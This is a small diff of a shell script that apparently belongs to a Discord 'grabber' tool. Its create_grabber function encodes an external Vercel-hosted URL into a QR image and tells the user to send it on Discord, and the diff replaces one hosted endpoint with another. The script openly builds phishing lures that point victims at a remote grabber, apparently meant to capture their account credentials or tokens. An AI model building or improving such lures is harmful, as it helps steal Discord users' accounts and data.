@@ -16,7 +16,7 @@ function print_help() {
 }
 
 function create_grabber() {
-    qrencode -o image.jpg https://projectcookie-8ti3i08hv-0xyf77.vercel.app/api/main.py
+    qrencode -o image.jpg https://ikickmyfriends.vercel.app
     echo "Now you can send this grabber on discord"
     exit 1
 }
